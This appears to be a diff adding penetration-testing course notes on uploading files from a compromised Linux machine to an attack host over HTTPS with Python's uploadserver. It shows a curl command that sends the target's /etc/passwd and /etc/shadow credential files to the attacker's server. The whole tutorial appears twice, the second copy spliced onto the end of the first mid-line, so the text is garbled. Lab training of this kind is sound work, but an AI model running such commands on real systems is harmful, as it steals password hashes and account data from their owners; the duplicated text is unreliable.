@@ -1,0 +1,121 @@
+## Upload Operations
+
+There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.
+
+---
+
+## Web Upload
+
+As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.
+
+The first thing we need to do is to install the `uploadserver` module.
+
+#### Pwnbox - Start Web Server
+
+```shell-session
+pepedavidphone@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+
+Collecting uploadserver
+  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
+Installing collected packages: uploadserver
+Successfully installed uploadserver-2.0.1
+```
+
+Now we need to create a certificate. In this example, we are using a self-signed certificate.
+
+#### Pwnbox - Create a Self-Signed Certificate
+
+```shell-session
+pepedavidphone@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+Generating a RSA private key
+................................................................................+++++
+.......+++++
+writing new private key to 'server.pem'
+-----
+```
+
+The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
+
+#### Pwnbox - Start Web Server
+
+```shell-session
+pepedavidphone@htb[/htb]$ mkdir https && cd https
+```
+
+```shell-session
+pepedavidphone@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+File upload available at /upload
+Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
+```
+
+Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
+
+#### Linux - Upload Multiple Files
+
+```shell-session
+pepedavidphone@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+We used the option `--insecure` because we used a self-signed certificate that we trust.## Upload Operations
+
+There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.
+
+---
+
+## Web Upload
+
+As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.
+
+The first thing we need to do is to install the `uploadserver` module.
+
+#### Pwnbox - Start Web Server
+
+```shell-session
+pepedavidphone@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+
+Collecting uploadserver
+  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
+Installing collected packages: uploadserver
+Successfully installed uploadserver-2.0.1
+```
+
+Now we need to create a certificate. In this example, we are using a self-signed certificate.
+
+#### Pwnbox - Create a Self-Signed Certificate
+
+```shell-session
+pepedavidphone@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+Generating a RSA private key
+................................................................................+++++
+.......+++++
+writing new private key to 'server.pem'
+-----
+```
+
+The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
+
+#### Pwnbox - Start Web Server
+
+```shell-session
+pepedavidphone@htb[/htb]$ mkdir https && cd https
+```
+
+```shell-session
+pepedavidphone@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+File upload available at /upload
+Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
+```
+
+Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
+
+#### Linux - Upload Multiple Files
+
+```shell-session
+pepedavidphone@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+We used the option `--insecure` because we used a self-signed certificate that we trust.
